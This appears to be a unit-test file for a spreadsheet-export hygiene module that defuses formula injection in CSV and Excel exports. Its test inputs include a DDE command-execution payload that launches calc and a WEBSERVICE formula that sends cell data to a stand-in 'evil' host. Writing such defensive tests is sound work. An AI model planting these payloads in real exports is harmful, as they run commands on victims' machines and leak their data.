"""Unit tests for spreadsheet formula neutralisation."""

import io

import pytest
from openpyxl import Workbook, load_workbook

from app.core.export_hygiene import defuse, defuse_worksheet, is_formula_like


class TestIsFormulaLike:
    @pytest.mark.parametrize(
        'value',
        [
            "=cmd|'/c calc'!A1",
            '=WEBSERVICE("http://evil/?x="&A1)',
            '+1+1',
            '@SUM(A1)',
            '-cmd',
            '   =lead-space',
        ],
    )
    def test_flags_formula_starts(self, value):
        assert is_formula_like(value)

    @pytest.mark.parametrize(
        'value',
        ['Milk', '', 'a=b', '-12.5', '-3', '1,5', None, 42, 3.5],
    )
    def test_leaves_ordinary_values_alone(self, value):
        assert not is_formula_like(value)


class TestDefuse:
    def test_prefixes_risky_text_with_a_tab(self):
        assert defuse('=1+1') == '\t=1+1'

    def test_returns_safe_values_unchanged(self):
        assert defuse('Milk') == 'Milk'
        assert defuse('-12.5') == '-12.5'
        assert defuse(None) is None


class TestDefuseWorksheet:
    def test_formula_cell_becomes_text(self):
        workbook = Workbook()
        worksheet = workbook.active
        worksheet['A1'] = "=cmd|'/c calc'!A1"
        worksheet['A2'] = 'Milk'
        assert worksheet['A1'].data_type == 'f'

        defuse_worksheet(worksheet)

        buffer = io.BytesIO()
        workbook.save(buffer)
        buffer.seek(0)
        reloaded = load_workbook(buffer).active

        assert reloaded['A1'].data_type == 's'
        assert reloaded['A1'].value == "=cmd|'/c calc'!A1"
        assert reloaded['A2'].value == 'Milk'


def test_rows_to_csv_defuses_data_cells_and_leaves_the_header_alone():
    from app.core.csv_export import rows_to_csv

    text = rows_to_csv(['Name', 'Qty'], [["=cmd|'/c calc'!A1", 3], ['Milk', None]])

    lines = text.splitlines()
    assert lines[0] == 'Name,Qty'
    assert lines[1].startswith("\t=cmd|'/c calc'!A1,")
    assert lines[2] == 'Milk,'
